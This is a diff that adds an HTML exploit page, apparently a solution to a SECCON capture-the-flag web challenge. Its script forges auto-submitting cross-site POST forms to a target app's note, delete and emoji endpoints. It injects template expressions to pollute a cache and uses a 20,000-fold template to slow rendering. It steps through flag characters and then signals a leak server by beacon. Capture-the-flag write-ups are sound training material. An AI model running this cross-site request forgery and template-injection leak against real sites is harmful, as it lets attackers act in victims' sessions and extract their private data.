@@ -1,0 +1,67 @@
+<body>
+  <script>
+    const params = new URLSearchParams(location.search);
+    const baseUrl = params.get("baseUrl");
+
+    const MAX_FLAG_LENGTH = 16;
+    const HEAVY_LEVEL = 20000;
+
+    const sleep = async (msec) =>
+      new Promise((resolve) => setTimeout(resolve, msec));
+
+    const createNote = (note) => {
+      const innerHtml = `
+        <form action="${baseUrl}/api/notes/create" method="post" target="_blank">
+          <input type="text" name="note" value="${note}">
+        </form>
+      `;
+      document.body.innerHTML += innerHtml;
+      document.forms[document.forms.length - 1].submit();
+    };
+
+    const deleteNote = (index) => {
+      const innerHtml = `
+        <form action="${baseUrl}/api/notes/delete" method="post" target="_blank">
+          <input type="text" name="index" value="${index}">
+        </form>
+      `;
+      document.body.innerHTML += innerHtml;
+      document.forms[document.forms.length - 1].submit();
+    };
+
+    const changeEmoji = (emoji) => {
+      const innerHtml = `
+        <form action="${baseUrl}/api/emojis/change" method="post" target="_blank">
+          <input type="text" name="emoji" value="${emoji}">
+        </form>
+      `;
+      document.body.innerHTML += innerHtml;
+      document.forms[document.forms.length - 1].submit();
+    };
+
+    const polluteCache = async (flagIndex) => {
+      const evilNote = `${flagIndex}-{{notes.${flagIndex}}}-{{emoji}}`;
+      createNote("dummy");
+      await sleep(500);
+      createNote(evilNote);
+      await sleep(500);
+      deleteNote(MAX_FLAG_LENGTH);
+      await sleep(1000);
+      deleteNote(MAX_FLAG_LENGTH);
+      await sleep(1000);
+    }
+
+    const main = async () => {
+      const heavyTemplate = "{{x}}".repeat(HEAVY_LEVEL);
+      changeEmoji(heavyTemplate);
+      await sleep(1000);
+
+      const known = "SECCON{";
+      for (let i = known.length; i<MAX_FLAG_LENGTH; i++) {
+        await polluteCache(i);
+      }
+      navigator.sendBeacon(`${location.origin}/start-leak`);
+    };
+    main();
+  </script>
+</body>
